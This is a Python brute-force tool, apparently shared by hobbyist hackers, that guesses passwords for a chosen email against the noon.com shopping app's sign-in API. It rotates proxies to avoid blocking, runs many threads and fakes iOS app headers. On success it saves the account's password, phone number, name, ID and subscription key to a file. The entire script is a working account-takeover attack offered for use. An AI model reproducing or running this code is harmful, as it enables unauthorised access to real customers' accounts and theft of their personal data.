#head~data by @D0omy
try:
	proxy=open('proxy.txt', 'r').read().splitlines()
except FileNotFoundError:
	print('ملف البروكسي غير موجود')
	print('Proxy file not found')
	input()
	exit()
def noon():
	global threading,requests,random,Thread,email
	try:
		pess=open('password.txt').read().splitlines()
	except FileNotFoundError:
		print('ملف الباسورد غير موجود')
		print('password file not found')
		try:
			input()
			exit()
		except KeyboardInterrupt:
			exit()
	proxylist=[]
	while True:
		for pxr in proxy:
			proxylist.append(pxr)
			pxx=str(random.choice(proxylist))
		for pess in pess:
			head={
                'Host': 'api-app.noon.com',
                'Cookie': 'missing',
                'Content-Type': 'application/json',
                'X-Experience': 'ecom',
                'X-Locale': 'ar-sa',
                'Accept': 'application/json, text/plain, */*',
                'X-Mp': 'noon',
                'Accept-Language': 'en-us',
                'Cache-Control': 'no-cache',
                'X-Content': 'mobile',
                'Content-Length': '52',
                'User-Agent': 'noon/1000 CFNetwork/1237 Darwin/20.4.0',
                'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',
                'X-Platform': 'ios',
                'X-Build': '1000',
                'Connection': 'close'}
			data={"email": email,"password": pess}		
			try:
				proxx = {
					'http': f'http://{pxx}',
					'https': f'http://{pxx}'}
				req1=requests.post("https://api-app.noon.com/_svc/customer-v1/auth/signin",headers=head,json=data,proxies=proxx,timeout=4)
				if req1.status_code==200:
					print(f'\n[+] Done [{email}:{pess}]')
					print(f'[+] Check acc_Done.txt For more INFO about this account')
					phone=req1.json()['data']['phone']
					lN=req1.json()['data']['lastName']
					lc=req1.json()['data']['languageCode']
					jD=req1.json()['data']['joinDate']
					ia=req1.json()['data']['id']
					gr=req1.json()['data']['gender']
					fnm=req1.json()['data']['firstName']
					coc=req1.json()['data']['countryCode']
					sKey=req1.json()['data']['subscriptionKey']
					with open('acc_Done.txt', 'a') as x:
						acc=f'Phone Num:[{phone}]\nLast Name:[{lN}]\nlanguage:[{lc}]\nJoin Date:[{jD}]\nID:[{ia}]\nGender:[{gr}]\nFirst Name:[{fnm}]\nEmail:[{email}]\nPassword:[{pess}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]'
						x.write(acc)
						exit()
				else:
					print(f'[-] NOT HACKED {email}:{pess}')
			except requests.exceptions.ConnectionError:
				print(f'[%] Bad Proxy <{str(pxx)}>')
				pass
			except KeyboardInterrupt:
				exit()
def TRT():
	global threading,requests,random,Thread,email
	thread=[]
	for i in range(Thread):
		thread1 = threading.Thread(target=noon)
		thread1.start()
		thread.append(thread1)
		for thread2 in thread:
			thread2.join()
def library():
	global threading,requests,random,Thread,email
	try:
		import requests,random
	except ModuleNotFoundError:
		print('يجب عليك تحميل المكتبة')
		print('You must download the library')
		print('pip install requests')
		exit()
	try:
		import threading
	except ModuleNotFoundError:
		print('يجب عليك تحميل المكتبة')
		print('You must download the library')
		print('pip install threading')
		exit()
	try:
		import pyfiglet
	except ModuleNotFoundError:
		print('يجب عليك تحميل المكتبة')
		print('You must download the library')
		print('pip install pyfiglet')
		exit()
	print(f"""[$] Brute Force 
	{pyfiglet.figlet_format('NooN')}---------------------------""")
	print("By  @TweakPY - @vv1ck")
	print("---------------------------")
	email=input("[?] Type Email or username:\n")
	Thread=int(input("[/] Thread: "))
	print("---------------------------")
	TRT()
library()
